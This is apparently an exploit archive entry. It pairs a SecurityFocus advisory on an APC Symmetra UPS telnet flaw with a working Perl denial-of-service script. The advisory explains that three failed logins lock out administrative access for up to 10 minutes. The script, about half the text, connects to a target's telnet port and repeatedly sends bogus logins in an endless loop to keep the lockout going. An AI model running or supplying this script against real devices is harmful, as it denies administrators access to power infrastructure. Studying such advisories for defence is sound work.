source: http://www.securityfocus.com/bid/2430/info

Symmetra is an Uninterruptable Power Supply manufactured by American Power Conversation Corporation (APC). Symmetra supports network options that allow a remote administrator to access the system via telnet, and gather information from the power supply via SNMP.

A problem with the network software used with the Symmetra can allow a denial of service to the system, thus preventing administrative access. This problem is due to the handling of the telnet protocol by the firmware of the power supply. The system does not support more than one telnet session at a time, and when it encounters three failed login attempts, discontinues access for a configurable period between 1 and 10 minutes.

Therefore, it is possible for a malicious user to launch an remote attack against the telnet service of the power supply, and prevent administrative access to the power supply for the duration of the attack. This vulnerability may affect other APC UPS products as well. 

#!/usr/bin/perl
#altomo@nudehackers.com
#apc management card dos

$user = "blacksun";
$time = "$ARGV[1]";

use IO::Socket;
$ip = "$ARGV[0]";
$port = "23";
if ($#ARGV<0) {
print " useage: $0 <hostname> <delay in seconds>\n";
exit();
}
$socket = IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>$ip,
PeerPort=>$port,);


print "Apc management card DoS\n";
print "altomo\@nudehackers.com\n";


sub dos() {
print "DoS started will attack every $time seconds\n";
print "Ctrl+C to exit\n";
print $socket "$user\r";
print $socket "$user\r";
print $socket "$user\r";
print $socket "$user\r";
print $socket "$user\r";
print $socket "$user\r";
print "\n";
close $socket;
sleep($time);          
&dos;

}
&dos;
#hong kong danger duo
